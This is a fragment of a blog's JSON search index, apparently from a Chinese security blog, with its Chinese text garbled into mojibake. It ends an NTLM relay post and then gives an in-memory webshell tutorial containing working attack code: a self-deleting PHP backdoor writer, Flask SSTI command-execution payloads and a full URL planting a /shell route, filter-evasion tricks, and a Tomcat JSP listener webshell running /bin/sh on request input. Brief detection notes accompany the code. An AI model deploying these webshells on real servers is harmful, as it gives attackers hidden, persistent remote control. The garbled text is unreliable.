Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"9 å¯ä»¥è·¨åè®® Relay çš„åœºæ™¯ æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œå°±èƒ½å¤ŸçŸ¥é“å“ªäº›åè®®å¯ä»¥ä¸­ç»§åˆ°å“ªäº›åè®®ã€‚ä¾‹å¦‚ï¼Œå·²ç»é˜è¿°äº†ä¸å¯èƒ½ä» SMB ä¸­ç»§åˆ° LDAP æˆ– LDAPSã€‚å¦å¤–ï¼Œå®¢æˆ·ç«¯å¦‚æœæ²¡æœ‰è®¾ç½® NEGOTIATE_SIGN æ ‡å¿—ä½ï¼Œä¸”ä¸éœ€è¦ç­¾åï¼Œæˆ–è€… LDAPS æœªå¼€å¯é€šé“ç»‘å®šï¼Œéƒ½å¯ä»¥ relay åˆ° LDAPã€‚ ç”±äºæ¡ˆä¾‹å¾ˆå¤šï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªè¡¨æ ¼æ€»ç»“äº†å…¶ä¸­çš„ä¸€äº›ã€‚ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:9:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å‚è€ƒ Pass the Hash NTLM Relay ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:10:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"Webshell å†…å­˜é©¬åˆ†æ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/","tags":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"title":"Webshell å†…å­˜é©¬åˆ†æ","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"Webshell å†…å­˜é©¬åˆ†æ å†…å­˜ webshell ç›¸æ¯”äºå¸¸è§„ webshell æ›´å®¹æ˜“èº²é¿ä¼ ç»Ÿå®‰å…¨ç›‘æµ‹è®¾å¤‡çš„æ£€æµ‹ï¼Œé€šå¸¸è¢«ç”¨æ¥åšæŒä¹…åŒ–ï¼Œè§„é¿æ£€æµ‹ï¼ŒæŒç»­é©»ç•™ç›®æ ‡æœåŠ¡å™¨ã€‚æ— æ–‡ä»¶æ”»å‡»ã€å†…å­˜ Webshellã€è¿›ç¨‹æ³¨å…¥ç­‰åŸºäºå†…å­˜çš„æ”»å‡»æ‰‹æ®µä¹Ÿå—åˆ°äº†å¤§å¤šæ•°æ”»å‡»è€…é’çã€‚ ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:0:0","tags":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"title":"Webshell å†…å­˜é©¬åˆ†æ","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"1 PHP å†…å­˜é©¬ ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:1:0","tags":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"title":"Webshell å†…å­˜é©¬åˆ†æ","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"1.1 åŸç† php å†…å­˜é©¬ä¹Ÿå°±æ˜¯ php ä¸æ­»é©¬æ˜¯å°†ä¸æ­»é©¬å¯åŠ¨ååˆ é™¤æœ¬èº«ï¼Œåœ¨å†…å­˜ä¸­æ‰§è¡Œæ­»å¾ªç¯ï¼Œä½¿ç®¡ç†å‘˜æ— æ³•åˆ é™¤æœ¨é©¬æ–‡ä»¶ã€‚ \u003c?php set_time_limit(0); ignore_user_abort(1); unlink(__FILE__); while (1) { $content = '\u003c?php @eval($_POST[\"zzz\"]) ?\u003e'; file_put_contents(\"config.php\", $content); usleep(10000); } ?\u003e ignore_user_abortï¼šå‡½æ•°è®¾ç½®ä¸å®¢æˆ·æœºæ–­å¼€æ˜¯å¦ä¼šç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œï¼Œå¦‚æœè®¾ç½®ä¸º trueï¼Œåˆ™å¿½ç•¥ä¸ç”¨æˆ·çš„æ–­å¼€ã€‚ set_time_limitï¼šè®¾ç½®å…è®¸è„šæœ¬è¿è¡Œçš„æ—¶é—´ï¼Œå•ä½ä¸ºç§’ã€‚å¦‚æœè®¾ç½®ä¸º 0ï¼ˆé›¶ï¼‰ï¼Œæ²¡æœ‰æ—¶é—´æ–¹é¢çš„é™åˆ¶ã€‚ ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:1:1","tags":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"title":"Webshell å†…å­˜é©¬åˆ†æ","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"1.2 æ£€æµ‹ æ£€æŸ¥æ‰€æœ‰ php è¿›ç¨‹å¤„ç†è¯·æ±‚çš„æŒç»­æ—¶é—´ æ£€æµ‹æ‰§è¡Œæ–‡ä»¶æ˜¯å¦åœ¨æ–‡ä»¶ç³»ç»ŸçœŸå®å­˜åœ¨ ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:1:2","tags":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"title":"Webshell å†…å­˜é©¬åˆ†æ","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"2 Python å†…å­˜é©¬ ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:2:0","tags":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"title":"Webshell å†…å­˜é©¬åˆ†æ","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"2.1 åŸç† Python å†…å­˜é©¬åˆ©ç”¨ flask æ¡†æ¶ä¸­ SSTI æ³¨å…¥æ¥å®ç°ï¼Œflask æ¡†æ¶ä¸­åœ¨ web åº”ç”¨æ¨¡æ¿æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ç”¨åˆ° render_template_string() è¿›è¡Œæ¸²æŸ“ï¼Œä½†æœªå¯¹ç”¨æˆ·ä¼ è¾“çš„ä»£ç è¿›è¡Œè¿‡æ»¤å¯¼è‡´ç”¨æˆ·å¯ä»¥é€šè¿‡æ³¨å…¥æ¶æ„ä»£ç æ¥å®ç° python å†…å­˜é©¬çš„æ³¨å…¥ã€‚ åœ¨ icehexman Github ä¸­å¯¹ flask æ¡†æ¶ä¸‹çš„å†…å­˜é©¬è¿›è¡Œäº†ç ”ç©¶ã€‚ 2.1.1 flask route ç±»æ¯” tomcat æ³¨å†Œè·¯ç”±çš„æœºåˆ¶ï¼Œå¦‚ filterï¼Œå¦‚æœæƒ³å®ç° python å†…å­˜é©¬ï¼Œä¹Ÿåº”è¯¥ç ”ç©¶ä¸‹ flask æ˜¯å¦èƒ½åŠ¨æ€æ³¨å†Œè·¯ç”±ã€‚ flask å¸¸è§„æ³¨å†Œçš„æ–¹å¼ä¸ºä½¿ç”¨è£…é¥°å™¨ @app.route() ã€‚è€Œå®é™…å·¥ä½œçš„å‡½æ•°ä¸ºè£…é¥°å™¨é‡Œè°ƒç”¨çš„æ–¹æ³• self.add_url_rule() ã€‚ add_url_rule éœ€è¦ä¸‰ä¸ªå‚æ•°ï¼š URLï¼šå’Œè£…é¥°å™¨ app.route() çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸€æ ·ï¼Œå¿…é¡»ä»¥ / å¼€å§‹ã€‚ endpointï¼šå°±æ˜¯åœ¨ä½¿ç”¨ url_for() è¿›è¡Œè·³è½¬çš„æ—¶å€™ï¼Œè¿™ä¸ªé‡Œé¢ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯è¿™ä¸ª endpoint å¯¹åº”çš„å€¼ã€‚è¿™ä¸ªå€¼ä¹Ÿå¯ä»¥ä¸æŒ‡å®šï¼Œé»˜è®¤å€¼ä¸ºå‡½æ•°åã€‚ view_funcï¼šåªéœ€è¦å†™æ–¹æ³•åï¼ˆä¹Ÿå¯ä»¥ä¸ºåŒ¿åå‚æ•°ï¼‰ï¼Œå¦‚æœä½¿ç”¨æ–¹æ³•åä¸è¦åŠ æ‹¬å·ï¼ŒåŠ æ‹¬å·è¡¨ç¤ºå°†å‡½æ•°çš„è¿”å›å€¼ä¼ ç»™äº† view_func å‚æ•°ã€‚ 2.1.2 flask context æƒ³å®ç°å†…å­˜ webshellï¼Œå…³é”®ç‚¹åœ¨äº view_func ã€‚view_func å¯ä»¥é‡‡ç”¨åŒ¿åå‡½æ•°å®šä¹‰é€»è¾‘ï¼Œè¯¥æ–¹æ³•è¦å®ç°æ•è·å‚æ•°å€¼ã€æ‰§è¡Œå‘½ä»¤ã€å“åº”ã€‚ Flask çš„å·¥ä½œåŸç†ï¼šå½“ä¸€ä¸ªè¯·æ±‚è¿›å…¥ Flaskï¼Œé¦–å…ˆä¼šå®ä¾‹åŒ–ä¸€ä¸ª Request Contextï¼Œè¿™ä¸ªä¸Šä¸‹æ–‡å°è£…äº†è¯·æ±‚çš„ä¿¡æ¯åœ¨ Request ä¸­ï¼Œå¹¶å°†è¿™ä¸ªä¸Šä¸‹æ–‡æ”¾å…¥åˆ°æ ˆ _request_ctx_stack çš„ç»“æ„ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´è·å–å½“å‰çš„è¯·æ±‚ä¸Šä¸‹æ–‡ç­‰åŒäºè·å– _request_ctx_stack çš„æ ˆé¡¶å…ƒç´  _request_ctx_stack.top ã€‚ 2.1.3 flask å†…ç½®å‡½æ•° é€šè¿‡ {{...}} å¯ä»¥æ‰§è¡Œè¡¨è¾¾å¼ï¼Œä½†æ˜¯å‘½åç©ºé—´æ˜¯å—é™çš„ï¼Œæ²¡æœ‰ builtinsï¼Œæ‰€ä»¥ evalã€popen è¿™äº›å‡½æ•°æ˜¯ä¸èƒ½ä½¿ç”¨çš„ã€‚ä½†æ˜¯å¯ä»¥é€šè¿‡ä»»æ„ä¸€ä¸ªå‡½æ•°çš„ func_globals è€Œå¾—åˆ°å…¶çš„å‘½åç©ºé—´ï¼Œè€Œå¾—åˆ° builtinsã€‚ Flask å†…ç½®äº†ä¸¤ä¸ªå‡½æ•° url_for å’Œ get_flashed_messagesã€‚ä¹Ÿå°±æ˜¯æ„é€ å‘½ä»¤æ‰§è¡Œï¼Œå¯ä»¥ä½¿ç”¨ï¼š {{url_for.__globals__['__builtins__'].__import__('os').system('ls')}} {{url_for.__globals__['__builtins__']['eval'](\"__import__('os').popen('whoami').read()\")}} ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:2:1","tags":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"title":"Webshell å†…å­˜é©¬åˆ†æ","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"2.2 å®ç° ä»¥ä¸‹é¢çš„ Demo ä»£ç ä¸ºä¾‹ï¼š from flask import Flask, request from flask import render_template_string app = Flask(__name__) @app.route('/') def hello_world(): return 'Hello World' @app.route('/test',methods=['GET', 'POST']) def test(): template = ''' \u003cdiv class=\"center-content error\"\u003e \u003ch1\u003eOops! That page doesn't exist.\u003c/h1\u003e \u003ch3\u003e%s\u003c/h3\u003e \u003c/div\u003e ''' %(request.values.get('param')) return render_template_string(template) if __name__ == '__main__': app.run(port=8000) å°† payload æ‹†è§£å¼€ï¼š url_for.__globals__['__builtins__']['eval']( \"app.add_url_rule( '/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read() ) \", { '_request_ctx_stack':url_for.__globals__['_request_ctx_stack'], 'app':url_for.__globals__['current_app'] } ) lambda å³åŒ¿åå‡½æ•°ï¼Œpayload ä¸­ add_url_rule() å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°å®šä¹‰äº†ä¸€ä¸ª lambda åŒ¿åå‡½æ•°ï¼Œå…¶ä¸­é€šè¿‡ os åº“çš„ popen() å‡½æ•°æ‰§è¡Œä» Web è¯·æ±‚ä¸­è·å–çš„ cmd å‚æ•°å€¼å¹¶è¿”å›ç»“æœï¼Œå…¶ä¸­è¯¥å‚æ•°å€¼é»˜è®¤ä¸º whoamiã€‚ eval() æ–¹æ³•çš„è¯­æ³•ï¼š eval(expression[, globals[, locals]]) globals - å˜é‡ä½œç”¨åŸŸï¼Œå…¨å±€å‘½åç©ºé—´ï¼Œå¦‚æœè¢«æä¾›ï¼Œåˆ™å¿…é¡»æ˜¯ä¸€ä¸ªå­—å…¸å¯¹è±¡ã€‚æŒ‡å®šå…¨å±€å˜é‡ã€‚ æœ€ç»ˆçš„ URLï¼š http://IP:8000/param?param={{url_for.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell%27,%20%27shell%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27whoami%27)).read())%22,{%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]})}} ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:2:2","tags":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"title":"Webshell å†…å­˜é©¬åˆ†æ","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"2.2 æ£€æµ‹ æŸ¥çœ‹æ‰€æœ‰å†…å»ºæ¨¡å—ä¸­æ˜¯å¦åŒ…å« evalã€exec ç­‰å¯ä»¥æ‰§è¡Œä»£ç çš„å‡½æ•°å¦‚ï¼šclass warnings.catch_warningsã€class site.Quitterç­‰ã€‚ æ£€æµ‹ self.add_url_rule() ä¸­ç‰¹æ®Šåå­—çš„è·¯ç”±å¦‚ shell ç­‰ã€‚ ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:2:3","tags":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"title":"Webshell å†…å­˜é©¬åˆ†æ","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"2.3 é€ƒé€¸ ä»¥ Python æ²™ç®±é€ƒé€¸çš„æŠ€å·§ä¸ºä¾‹ï¼š url_for å¯ç”¨ get_flashed_messages æˆ– request.application.__self__._get_data_for_json ç­‰æ›¿æ¢ï¼› ä»£ç æ‰§è¡Œå‡½æ•°æ›¿æ¢ï¼Œå¦‚ exec ç­‰æ›¿æ¢ evalï¼› å­—ç¬¦ä¸²å¯é‡‡ç”¨æ‹¼æ¥æ–¹å¼ï¼Œå¦‚ ['__builtins__']['eval'] å˜ä¸º ['__bui'+'ltins__']['ev'+'al']ï¼› __globals__ å¯ç”¨ __getattribute__('__globa'+'ls__') æ›¿æ¢ï¼› [] ä¸­æ‹¬å·å¯ç”¨ .__getitem__() æˆ– .pop() æ›¿æ¢ï¼› â€¦ ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:2:4","tags":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"title":"Webshell å†…å­˜é©¬åˆ†æ","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"3 Java å†…å­˜é©¬ ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:3:0","tags":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"title":"Webshell å†…å­˜é©¬åˆ†æ","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"3.1 ç®€ä»‹ Java å†…å­˜é©¬ç›®å‰ä¸»è¦åˆ†ä¸º 2 ç±»ï¼š Servlet-API å‹ é€šè¿‡å‘½ä»¤æ‰§è¡Œç­‰æ–¹å¼åŠ¨æ€æ³¨å†Œä¸€ä¸ªæ–°çš„ listenerã€filter æˆ–è€… servletï¼Œä»è€Œå®ç°å‘½ä»¤æ‰§è¡Œç­‰åŠŸèƒ½ã€‚ç‰¹å®šæ¡†æ¶ã€å®¹å™¨çš„å†…å­˜é©¬åŸç†ä¸æ­¤ç±»ä¼¼ï¼Œå¦‚ spring çš„ controller å†…å­˜é©¬ï¼Œtomcat çš„ valve å†…å­˜é©¬ å­—èŠ‚ç å¢å¼ºå‹ é€šè¿‡ java çš„ instrumentation åŠ¨æ€ä¿®æ”¹å·²æœ‰ä»£ç ï¼Œè¿›è€Œå®ç°å‘½ä»¤æ‰§è¡Œç­‰åŠŸèƒ½ã€‚ ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:3:1","tags":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"title":"Webshell å†…å­˜é©¬åˆ†æ","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"3.2 åŸç† Servletã€Listenerã€Filter ç”± javax.servlet.ServletContext å»åŠ è½½ï¼Œæ— è®ºæ˜¯ä½¿ç”¨ xml é…ç½®æ–‡ä»¶è¿˜æ˜¯ä½¿ç”¨ Annotation æ³¨è§£é…ç½®ï¼Œå‡ç”± Web å®¹å™¨è¿›è¡Œåˆå§‹åŒ–ï¼Œè¯»å–å…¶ä¸­çš„é…ç½®å±æ€§ï¼Œç„¶åå‘å®¹å™¨ä¸­è¿›è¡Œæ³¨å†Œã€‚ Servlet 3.0 API å…è®¸ä½¿ ServletContext ç”¨åŠ¨æ€è¿›è¡Œæ³¨å†Œï¼Œåœ¨ Web å®¹å™¨åˆå§‹åŒ–çš„æ—¶å€™ï¼ˆå³å»ºç«‹ ServletContext å¯¹è±¡çš„æ—¶å€™ï¼‰è¿›è¡ŒåŠ¨æ€æ³¨å†Œã€‚ä¸åŒçš„å®¹å™¨å®ç°æ–¹å¼ç•¥æœ‰å·®å¼‚ï¼Œä¸‹æ–‡ä¸»è¦ä»¥ Tomcat ä¸ºä¾‹ã€‚ 3.2.1 Tomcat Tomcat ä¸­ä¸»è¦åŒ…æ‹¬å››ç§å®¹å™¨ï¼ŒEngineã€Hostã€Contextã€Wrapper Engine ä¸ºå¤–éƒ¨æ¥å£ï¼Œå¯ä»¥é…ç½®å¤šä¸ª Host ä¸€ä¸ª Host å¯ä»¥åŒ…å«å¤šä¸ª Context(WEB åº”ç”¨) ä¸€ä¸ª Context å¯ä»¥åŒ…å«å¤šä¸ª Wrapper æ¯ä¸ª Wrapper å¯¹åº” 1 ä¸ª Servlet Context å¯¹åº”çš„ Web åº”ç”¨, æ¯ä¸€ä¸ª Context éƒ½æœ‰å”¯ä¸€çš„ path, è¿™é‡Œçš„ path ä¸æ˜¯æŒ‡ servlet ç»‘å®šçš„ WebServlet åœ°å€, è€Œæ˜¯æŒ‡çš„æ˜¯ç‹¬ç«‹çš„ä¸€ä¸ª Web åº”ç”¨åœ°å€ï¼Œå°±å¥½æ¯” Tomat é»˜è®¤çš„ / åœ°å€å’Œ manager åœ°å€å°±æ˜¯ä¸¤ä¸ªä¸åŒçš„ web åº”ç”¨ï¼Œæ‰€ä»¥å¯¹åº”ä¸¤ä¸ªä¸åŒçš„ Contextï¼Œè¦æ·»åŠ  Context éœ€è¦åœ¨ server.xml ä¸­é…ç½® docbaseã€‚ åœ¨ä¸€ä¸ª web åº”ç”¨ä¸­å¯ä»¥é…ç½®å¤šä¸ªè®¿é—®è·¯å¾„ï¼Œæ¯”å¦‚ç™»å½•é¡µé¢ï¼Œåå°ç®¡ç†ç­‰ï¼Œå¯¹äºåŒä¸€ä¸ª Context ä¸­ä¸åŒçš„ WebServlet åœ°å€ï¼Œå°†ä¼šåˆ†é…ä¸åŒçš„ Wrapperã€‚è¿™å°±è¯´æ˜äº†æ¯ä¸ª Context å¯ä»¥å¯¹åº”å¤šä¸ª Wrapperï¼Œæ¯ä¸ª Wrapper å¯¹åº”ä¸€ä¸ª Servletã€‚è¯´æ˜åŒä¸€ä¸ª web åº”ç”¨ context ç›¸åŒä½†æ˜¯å¯¹åº”çš„ Wrapper ä¸åŒï¼Œç„¶åæ ¹æ®ä¸åŒçš„ Servlet æœåŠ¡å±•ç¤ºä¸åŒçš„å†…å®¹ã€‚ æŠ€å·§ IDEA åˆ›å»º Java Web é¡¹ç›®å¯å‚è€ƒï¼šhttps://blog.csdn.net/gaoqingliang521/article/details/108677301 3.2.2 Listener å†…å­˜é©¬ ç›‘å¬å™¨ç”¨äºç›‘å¬ Web åº”ç”¨ä¸­æŸäº›å¯¹è±¡çš„åˆ›å»ºã€é”€æ¯ã€å¢åŠ ï¼Œä¿®æ”¹ï¼Œåˆ é™¤ç­‰åŠ¨ä½œçš„å‘ç”Ÿï¼Œç„¶åä½œå‡ºç›¸åº”çš„å“åº”å¤„ç†ã€‚å½“ç›‘å¬èŒƒå›´çš„å¯¹è±¡çš„çŠ¶æ€å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨è‡ªåŠ¨è°ƒç”¨ç›‘å¬å™¨å¯¹è±¡ä¸­çš„æ–¹æ³•ã€‚å¸¸ç”¨äºç»Ÿè®¡ç½‘ç«™åœ¨çº¿äººæ•°ã€ç³»ç»ŸåŠ è½½æ—¶è¿›è¡Œä¿¡æ¯åˆå§‹åŒ–ã€ç»Ÿè®¡ç½‘ç«™çš„è®¿é—®é‡ç­‰ç­‰ã€‚ ä¸»è¦ç”±ä¸‰éƒ¨åˆ†æ„æˆï¼š äº‹ä»¶æºï¼šè¢«ç›‘å¬çš„å¯¹è±¡ ç›‘å¬å™¨ï¼šç›‘å¬çš„å¯¹è±¡ï¼Œäº‹ä»¶æºçš„å˜åŒ–ä¼šè§¦å‘ç›‘å¬å™¨çš„å“åº”è¡Œä¸º å“åº”è¡Œä¸ºï¼šç›‘å¬å™¨ç›‘å¬åˆ°äº‹ä»¶æºçš„çŠ¶æ€å˜åŒ–æ—¶æ‰€æ‰§è¡Œçš„åŠ¨ä½œ åœ¨åˆå§‹åŒ–æ—¶ï¼Œéœ€è¦å°†äº‹ä»¶æºå’Œç›‘å¬å™¨è¿›è¡Œç»‘å®šï¼Œä¹Ÿå°±æ˜¯æ³¨å†Œç›‘å¬å™¨ã€‚è¯·æ±‚ç½‘ç«™çš„æ—¶å€™ï¼Œç¨‹åºå…ˆè‡ªåŠ¨æ‰§è¡Œ listener ç›‘å¬å™¨çš„å†…å®¹, å†å»æ‰§è¡Œ filter è¿‡æ»¤å™¨ï¼Œå¦‚æœå­˜åœ¨å¤šä¸ªè¿‡æ»¤å™¨åˆ™ä¼šç»„æˆè¿‡æ»¤é“¾ï¼Œæœ€åä¸€ä¸ªè¿‡æ»¤å™¨å°†ä¼šå»æ‰§è¡Œ Servlet çš„ service æ–¹æ³•ï¼Œå³ Listener -\u003e Filter -\u003e Servletã€‚ Listener æ˜¯æœ€å…ˆè¢«åŠ è½½çš„, æ‰€ä»¥å¯ä»¥åˆ©ç”¨åŠ¨æ€æ³¨å†Œæ¶æ„çš„ Listener æ¤å…¥å†…å­˜é©¬ã€‚ Listener åˆ†ç±» ServletContext ç›‘å¬ï¼ŒæœåŠ¡å™¨å¯åŠ¨å’Œç»ˆæ­¢æ—¶è§¦å‘ ServletContextListenerï¼šç”¨äºç›‘å¬æ•´ä¸ª Servlet ä¸Šä¸‹æ–‡ï¼ˆåˆ›å»ºã€é”€æ¯ï¼‰ ServletContextAttributeListenerï¼šå¯¹ Servlet ä¸Šä¸‹æ–‡å±æ€§è¿›è¡Œç›‘å¬ï¼ˆå¢åˆ æ”¹å±æ€§ï¼‰ Session ç›‘å¬ï¼ŒSession å»ºç«‹æ‘§æ¯æ—¶è§¦å‘ javax.servlet.http.HttpSessionListenerï¼šå¯¹ Session æ•´ä½“çŠ¶æ€çš„ç›‘å¬ javax.servlet.http.HttpSessionAttributeListenerï¼šå¯¹ Session å±æ€§çš„ç›‘å¬ Request ç›‘å¬ï¼Œæ¯æ¬¡è®¿é—®æœåŠ¡æ—¶è§¦å‘ ServletRequestListenerï¼šå¯¹ Request è¯·æ±‚è¿›è¡Œç›‘å¬ï¼ˆåˆ›å»ºã€é”€æ¯ï¼‰ ServletRequestAttributeListenerï¼šå¯¹ Request å±æ€§è¿›è¡Œç›‘å¬ï¼ˆå¢åˆ æ”¹å±æ€§ï¼‰ å¦‚æœèƒ½åŠ¨æ€æ·»åŠ  Listener é‚£ Request ç›‘å¬æœ€é€‚åˆæ¤å…¥å†…å­˜é©¬ã€‚ ServletRequestListener æä¾›ä¸¤ä¸ªæ–¹æ³•ï¼šrequestInitialized å’Œ requestDestroyedï¼Œä¸¤ä¸ªæ–¹æ³•å‡æ¥æ”¶ ServletRequestEvent ä½œä¸ºå‚æ•°ï¼ŒServletRequestEvent ä¸­åˆå‚¨å­˜äº† ServletContext å¯¹è±¡å’Œ ServletRequest å¯¹è±¡ï¼Œå› æ­¤åœ¨è®¿é—®è¯·æ±‚è¿‡ç¨‹ä¸­å¯ä»¥åœ¨ request åˆ›å»ºå’Œé”€æ¯æ—¶å®ç°è‡ªå·±çš„æ¶æ„ä»£ç ï¼Œå®Œæˆå†…å­˜é©¬çš„å®ç°ã€‚ \u003c%@ page import=\"org.apache.catalina.core.StandardContext\" %\u003e \u003c%@ page import=\"org.apache.catalina.core.ApplicationContext\" %\u003e \u003c%@ page import=\"java.lang.reflect.Field\" %\u003e \u003c%@ page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%\u003e \u003c%@ page import=\"org.apache.jasper.tagplugins.jstl.core.Out\" %\u003e \u003c%@ page import=\"java.io.IOException\" %\u003e \u003c%@ page import=\"javax.servlet.annotation.WebServlet\" %\u003e \u003c%@ page import=\"java.io.InputStreamReader\" %\u003e \u003c%@ page import=\"java.io.BufferedReader\" %\u003e \u003c% Object obj = request.getServletContext(); Field field = obj.getClass().getDeclaredField(\"context\"); field.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) field.get(obj); field = applicationContext.getClass().getDeclaredField(\"context\"); field.setAccessible(true); StandardContext standardContext = (StandardContext) field.get(applicationContext); ListenH listenH = new ListenH(request, response); standardContext.addApplicationEventListener(listenH); out.print(\"test\"); %\u003e \u003c%! public class ListenH implements ServletRequestListener { public ServletResponse response; public ServletRequest request; ListenH(ServletRequest request, ServletResponse response) { this.request = request; this.response = response; } public void requestDestroyed(ServletRequestEvent servletRequestEvent) { } public void requestInitialized(ServletRequestEvent servletRequestEvent) { String cmder = request.getParameter(\"cmd\"); String[] cmd = new String[]{\"/bin/sh\", \"-c\", cmder}; try { Process ps = Runtime.getRuntime().exec(cmd); BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream())); StringBuffer sb = new StringBuffer(); String line; while ((line = br.readLine()) != null) { //æ‰§è¡Œç»“æœåŠ ä¸Šå›è½¦ sb.append(line).append(\"\u003cbr\u003e\"); } String result = sb.toString(); this.response.getWriter().write(result); }catch (Exception e){ System.out.println(\"error \"); } } } %\u003e é€šè¿‡ jsp å°è¯•åŠ¨æ€æ·»åŠ  Listenerï¼Œè¿™é‡Œéœ€è¦æ³¨æ„, å› ä¸ºæˆ‘ä»¬æ˜¯ç›´æ¥é€šè¿‡ add æ¥æ·»åŠ , æ‰€ä»¥æ¯æ¬¡è®¿é—®è¯¥ jsp é¡µé¢çš„æ—¶å€™éƒ½ä¼šé‡å¤æ·»åŠ  List","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:3:2","tags":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"title":"Webshell 